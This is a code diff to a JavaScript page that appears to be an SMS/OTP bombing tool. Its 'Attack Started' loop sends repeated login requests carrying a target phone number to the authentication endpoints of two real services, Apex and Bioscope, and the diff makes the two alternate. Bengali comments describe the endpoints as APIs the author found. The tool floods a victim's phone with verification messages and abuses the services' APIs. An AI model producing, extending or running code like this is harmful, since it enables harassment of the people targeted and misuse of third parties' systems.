@@ -33,21 +33,27 @@ async function startProcess() {
         return;
     }
 
-    display.innerText = "Apex Attack Started...";
+    display.innerText = "Attack Started...";
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // আপনার নিজের খুঁজে বের করা Apex POST API
-            await fetch('https://api.apex4u.com/api/auth/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    "phoneNumber": target // Payload থেকে পাওয়া কি-ওয়ার্ড
-                }),
-                mode: 'cors'
-            }); 
+            if (i % 2 !== 0) {
+                // ১. আপনার পাওয়া Apex API
+                await fetch('https://api.apex4u.com/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ "phoneNumber": target }), //
+                    mode: 'cors'
+                });
+            } else {
+                // ২. আপনার পাওয়া Bioscope API
+                await fetch('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ "number": "+88" + target }), // Bioscope এ +88 লাগে
+                    mode: 'cors'
+                });
+            }
 
             display.innerText = "Sent: " + i;
             
@@ -81,7 +87,7 @@ function activateCooldown(seconds) {
     }, 1000);
 }
 
-// Matrix Background Animation
+// Matrix Background Animation (আপনার আগের ডিজাইন অনুযায়ী)
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
